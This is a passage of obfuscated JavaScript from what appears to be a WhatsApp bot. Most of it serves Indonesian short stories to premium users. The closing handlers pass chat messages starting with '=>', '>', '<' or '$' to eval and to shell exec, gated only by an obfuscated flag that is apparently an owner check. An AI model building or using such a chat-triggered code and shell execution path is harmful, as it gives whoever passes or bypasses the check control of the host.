          _0x353dad.reply(
            '\u2B54 _*Title :*_ ' +
              _0x172b91[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x172b91[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x172b91[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x172b91[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x172b91[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1129):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad.reply(
            _0x5acefe(1417) +
              _0x5eb8d9[_0x5acefe(744)] +
              '\n\u2B54 _*Author :*_ ' +
              _0x5eb8d9[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x5eb8d9.kategori +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x5eb8d9.lolos +
              _0x5acefe(705) +
              _0x5eb8d9[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(937):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad.reply(
            _0x5acefe(1417) +
              _0x5b3bc4.title +
              _0x5acefe(1235) +
              _0x5b3bc4[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x5b3bc4.kategori +
              _0x5acefe(1347) +
              _0x5b3bc4[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x5b3bc4.cerita
          )
        }
        break
      case _0x5acefe(897):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x37c807[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x37c807.author +
              _0x5acefe(954) +
              _0x37c807[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x37c807[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x37c807[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1161):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x3255fc[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x3255fc.author +
              _0x5acefe(954) +
              _0x3255fc.kategori +
              _0x5acefe(1347) +
              _0x3255fc[_0x5acefe(1105)] +
              '\n\u2B54 _*Story :*_\n' +
              _0x3255fc[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1214):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x5e9a43[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x5e9a43[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x5e9a43.kategori +
              _0x5acefe(1347) +
              _0x5e9a43.lolos +
              '\n\u2B54 _*Story :*_\n' +
              _0x5e9a43[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1178):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x128a28.title +
              _0x5acefe(1235) +
              _0x128a28.author +
              _0x5acefe(954) +
              _0x128a28[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x128a28[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x128a28.cerita
          )
        }
        break
      case _0x5acefe(581):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x2143c9.title +
              _0x5acefe(1235) +
              _0x2143c9[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x2143c9.kategori +
              _0x5acefe(1347) +
              _0x2143c9[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x2143c9[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1267):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x3baabb.title +
              _0x5acefe(1235) +
              _0x3baabb[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x3baabb.kategori +
              _0x5acefe(1347) +
              _0x3baabb.lolos +
              '\n\u2B54 _*Story :*_\n' +
              _0x3baabb[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1355):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x1040df.title +
              _0x5acefe(1235) +
              _0x1040df.author +
              _0x5acefe(954) +
              _0x1040df[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x1040df.lolos +
              '\n\u2B54 _*Story :*_\n' +
              _0x1040df[_0x5acefe(947)]
          )
        }
        break
      case 'cerpen_motivasi':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0xde089d[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0xde089d[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0xde089d.kategori +
              _0x5acefe(1347) +
              _0xde089d.lolos +
              _0x5acefe(705) +
              _0xde089d[_0x5acefe(947)]
          )
        }
        break
      case 'cerpen_nasihat':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x50a1c0[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x50a1c0.author +
              _0x5acefe(954) +
              _0x50a1c0[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x50a1c0[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x50a1c0[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1070):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad.reply(
            _0x5acefe(1417) +
              _0x2f4bdb[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x2f4bdb[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x2f4bdb[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x2f4bdb[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x2f4bdb[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(904):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x166e58[_0x5acefe(744)] +
              '\n\u2B54 _*Author :*_ ' +
              _0x166e58[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x166e58[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x166e58.lolos +
              '\n\u2B54 _*Story :*_\n' +
              _0x166e58[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(641):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x496427[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x496427[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x496427[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x496427[_0x5acefe(1105)] +
              '\n\u2B54 _*Story :*_\n' +
              _0x496427[_0x5acefe(947)]
          )
        }
        break
      case 'cerpen_penantian':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x4c5e1a[_0x5acefe(744)] +
              '\n\u2B54 _*Author :*_ ' +
              _0x4c5e1a[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x4c5e1a[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x4c5e1a[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x4c5e1a.cerita
          )
        }
        break
      case _0x5acefe(985):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x3b466d.title +
              '\n\u2B54 _*Author :*_ ' +
              _0x3b466d.author +
              _0x5acefe(954) +
              _0x3b466d[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x3b466d[_0x5acefe(1105)] +
              '\n\u2B54 _*Story :*_\n' +
              _0x3b466d[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(670):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad.reply(
            _0x5acefe(1417) +
              _0x47b3a4[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x47b3a4.author +
              _0x5acefe(954) +
              _0x47b3a4[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x47b3a4.lolos +
              _0x5acefe(705) +
              _0x47b3a4[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1173):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad.reply(
            _0x5acefe(1417) +
              _0x10fd68[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x10fd68[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x10fd68[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x10fd68[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x10fd68.cerita
          )
        }
        break
      case 'cerpen_penyesalan':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x10f392.title +
              '\n\u2B54 _*Author :*_ ' +
              _0x10f392[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x10f392[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x10f392[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x10f392[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(369):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x33cebc[_0x5acefe(744)] +
              '\n\u2B54 _*Author :*_ ' +
              _0x33cebc.author +
              _0x5acefe(954) +
              _0x33cebc[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x33cebc[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x33cebc[_0x5acefe(947)]
          )
        }
        break
      case 'cerpen_perpisahan':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x208295[_0x5acefe(744)] +
              '\n\u2B54 _*Author :*_ ' +
              _0x208295.author +
              _0x5acefe(954) +
              _0x208295[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x208295[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x208295[_0x5acefe(947)]
          )
        }
        break
      case 'cerpen_persahabatan':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad.reply(
            _0x5acefe(1417) +
              _0x52b8e8[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x52b8e8[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x52b8e8.kategori +
              _0x5acefe(1347) +
              _0x52b8e8[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x52b8e8.cerita
          )
        }
        break
      case 'cerpen_petualangan':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x235bc8[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x235bc8[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x235bc8[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x235bc8[_0x5acefe(1105)] +
              '\n\u2B54 _*Story :*_\n' +
              _0x235bc8.cerita
          )
        }
        break
      case 'cerpen_ramadhan':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0x15c0ae[_0x5acefe(744)] +
              '\n\u2B54 _*Author :*_ ' +
              _0x15c0ae.author +
              _0x5acefe(954) +
              _0x15c0ae[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x15c0ae.lolos +
              _0x5acefe(705) +
              _0x15c0ae[_0x5acefe(947)]
          )
        }
        break
      case 'cerpen_remaja':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad.reply(
            _0x5acefe(1417) +
              _0x549d70.title +
              _0x5acefe(1235) +
              _0x549d70.author +
              _0x5acefe(954) +
              _0x549d70[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x549d70[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x549d70[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(852):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x11a040[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x11a040.author +
              _0x5acefe(954) +
              _0x11a040[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x11a040[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x11a040[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1123):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x192868[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0x192868[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x192868[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x192868[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x192868[_0x5acefe(947)]
          )
        }
        break
      case _0x5acefe(1051):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess.premium)
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x5c2c01.title +
              _0x5acefe(1235) +
              _0x5c2c01[_0x5acefe(1384)] +
              '\n\u2B54 _*Category :*_ ' +
              _0x5c2c01[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x5c2c01[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x5c2c01.cerita
          )
        }
        break
      case _0x5acefe(422):
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            _0x5acefe(1417) +
              _0xeab2d[_0x5acefe(744)] +
              _0x5acefe(1235) +
              _0xeab2d[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0xeab2d.kategori +
              _0x5acefe(1347) +
              _0xeab2d[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0xeab2d.cerita
          )
        }
        break
      case 'cerpen_sedih':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x45a029.title +
              _0x5acefe(1235) +
              _0x45a029[_0x5acefe(1384)] +
              _0x5acefe(954) +
              _0x45a029[_0x5acefe(565)] +
              '\n\u2B54 _*Pass Moderation :*_ ' +
              _0x45a029[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x45a029.cerita
          )
        }
        break
      case 'cerpen_sejarah':
        {
          if (!_0x5be15c) {
            return _0x3b9ed4(mess[_0x5acefe(1243)])
          }
          _0x353dad[_0x5acefe(1036)](
            '\u2B54 _*Title :*_ ' +
              _0x31ba45.title +
              _0x5acefe(1235) +
              _0x31ba45.author +
              _0x5acefe(954) +
              _0x31ba45[_0x5acefe(565)] +
              _0x5acefe(1347) +
              _0x31ba45[_0x5acefe(1105)] +
              _0x5acefe(705) +
              _0x31ba45[_0x5acefe(947)]
          )
        }
        break
      default:
    }
    if (_0x4eba49.startsWith('=>')) {
      if (!_0x3c922f) {
        return
      }
      function _0x45feaa(_0x23e4b2) {
        const _0x1eee68 = _0x5acefe
        return (
          (sat = JSON[_0x1eee68(998)](_0x23e4b2, null, 2)),
          (bang = util[_0x1eee68(531)](sat)),
          sat == undefined && (bang = util[_0x1eee68(531)](_0x23e4b2)),
          _0x353dad[_0x1eee68(1036)](bang)
        )
      }
      try {
        _0x353dad[_0x5acefe(1036)](
          util[_0x5acefe(531)](
            eval(
              '(async () => { ' + _0x4eba49[_0x5acefe(1376)](3) + _0x5acefe(385)
            )
          )
        )
      } catch (_0x3e37fc) {
        _0x353dad[_0x5acefe(1036)](String(_0x3e37fc))
      }
    }
    if (_0x4eba49[_0x5acefe(936)]('>')) {
      if (!_0x3c922f) {
        return
      }
      try {
        if (typeof _0x3258fc !== _0x5acefe(1041)) {
          _0x3258fc = require(_0x5acefe(733))[_0x5acefe(911)](_0x3258fc)
        }
        await _0x353dad[_0x5acefe(1036)](_0x3258fc)
      } catch (_0x511883) {
        _0x353dad[_0x5acefe(1036)](String(_0x511883))
      }
    }
    if (_0x4eba49[_0x5acefe(936)]('<')) {
      if (!_0x3c922f) {
        return
      }
      try {
        return _0x353dad[_0x5acefe(1036)](
          JSON[_0x5acefe(998)](
            eval('' + _0x492e22[_0x5acefe(1341)](' ')),
            null,
            '\t'
          )
        )
      } catch (_0x485f91) {
        reply(_0x485f91)
      }
    }
    if (_0x4eba49.startsWith('$')) {
      if (!_0x3c922f) {
        return
      }
      qur = _0x4eba49.slice(2)
      exec(qur, (_0x5e5bfb, _0x3b6a6b) => {
        const _0x54193e = _0x5acefe
        if (_0x5e5bfb) {
          return _0x353dad[_0x54193e(1036)]('' + _0x5e5bfb)
        }
        _0x3b6a6b && _0x353dad[_0x54193e(1036)](_0x3b6a6b)
      })
    }
  } catch (_0x20e971) {
    _0x353dad[_0x5acefe(1036)](util[_0x5acefe(531)](_0x20e971))
  }
}
process.on('uncaughtException', console.error)
